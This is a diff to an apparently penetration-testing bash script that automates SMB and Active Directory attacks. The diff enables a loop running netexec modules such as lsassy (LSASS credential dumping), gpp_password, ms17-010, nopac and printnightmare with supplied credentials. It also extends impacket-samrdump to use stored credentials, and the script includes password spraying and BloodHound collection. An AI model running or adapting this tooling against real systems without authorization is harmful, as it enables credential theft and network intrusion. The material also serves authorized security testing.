@@ -77,10 +77,15 @@ touch "$enumx_dir"/domains
 sort -u "$enumx_dir"/domains -o "$enumx_dir"/domains 2>/dev/null
 
 if [ ! -s "$enumx_dir/modules" ]; then
-    echo "enum_av
+echo "
+enum_av
 enum_ca
+gpp_autologin
+gpp_password
+ms17-010
 spooler
 printnightmare
+nopac
 lsassy
 " >> "$enumx_dir/modules"
 fi
@@ -158,11 +163,11 @@ smb_enum() {
 				echo "$ridbrute" | grep -viE 'erro|│|╭|╰|[*]|[-]' | grep -E '[+]|SidTypeUser' | sed -E '1d'
 				echo "$ridbrute" | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | grep -viE '\$|error|sm_|mailbox|_denied' | tee -a "$enumx_dir/usernames"
 				sort -fu "$enumx_dir/usernames" -o "$enumx_dir/usernames" 2>/dev/null
-	#			echo "Using netexec modules as $credu:$credp on $target..."
-	#			while IFS= read -r module; do
-	#				netexec smb "$target" --port "$port" -u "$credu" "$ph" "$credp" -M "$module" 2>/dev/null | grep -viE '[*]|[+]|erro|│|╭|╰| |is not|failed|refused|cannot|associated'
-	#				echo
-	#			done < "$enumx_dir/modules"
+				echo "Using netexec modules as $credu:$credp on $target..."
+				while IFS= read -r module; do
+					netexec smb "$target" --port "$port" -u "$credu" "$ph" "$credp" -M "$module" 2>/dev/null #| grep -viE '[*]|[+]|erro|│|╭|╰|is not|failed|refused|cannot|associated'
+					echo
+				done < "$enumx_dir/modules"
 				if [ "$file" == "creds" ]; then
 					while IFS= read -r share; do
 						echo "Authenticating as $credu:$credp on share $share..."
@@ -308,8 +313,17 @@ for port in $open_ports; do
             ;;
         139)
             # https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
-            impacket-samrdump "$target" | grep -viE 'comment'
-            impacket-samrdump "$target" | grep -E '(/.*Comment): [^:]'
+            while IFS= read -r cred; do
+				read credu credp <<< $(echo "$cred" | sed 's/:/ /')
+				if [ -z "$credp" ]; then
+					impacket-samrdump "$target" | grep -viE 'comment'
+					impacket-samrdump "$target" | grep -E '(/.*Comment): [^:]'
+				else
+		            impacket-samrdump "$credu":"$credp"@"$target" | grep -viE 'comment'
+		            impacket-samrdump "$credu":"$credp"@"$target" | grep -E '(/.*Comment): [^:]'
+				fi
+			done < "$enumx_dir/creds"
+		
             netexec smb "$target" --port "$port" -u "guest" -p "" --shares | tr -d '\0'
        		if [ ! -s "$enumx_dir/creds" ]; then      			
 	       		spray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success | grep -viE '\\:' 2>/dev/null)
@@ -655,6 +669,7 @@ if [ -n "$enumx_dir/creds" ]; then
 		                    cd "$enumx_dir"; bloodhound-python -c default -u "$credu" -p "$credp" -d "$domain" -dc "$dc" -ns "$target" 2>&1 | grep -v '^[[:space:]]\{4,\}' | grep -vE 'exception|timed out|Querying|/usr/|Traceback|LifetimeTimeout|Done in|10 workers|Getting TGT|Error:' >> "$enumx_dir"/output
 		                    cd "$enumx_dir"; bloodhound-python -c all -u "$credu" -p "$credp" -d "$domain" -dc "$dc" -ns "$target" 2>&1 | grep -v '^[[:space:]]\{4,\}' | grep -vE 'exception|timed out|Querying|/usr/|Traceback|LifetimeTimeout|Done in|10 workers|Getting TGT|Error:' >> "$enumx_dir"/output
 		                    sort -u "$enumx_dir"/output -o "$enumx_dir"/output 2>/dev/null
+		                fi
 		            done < "$enumx_dir/domains"
 		        done < "$enumx_dir/domains"
 		    mv "$enumx_dir"/*.json "$enumx_dir/bloodhound/$credu" 2>/dev/null
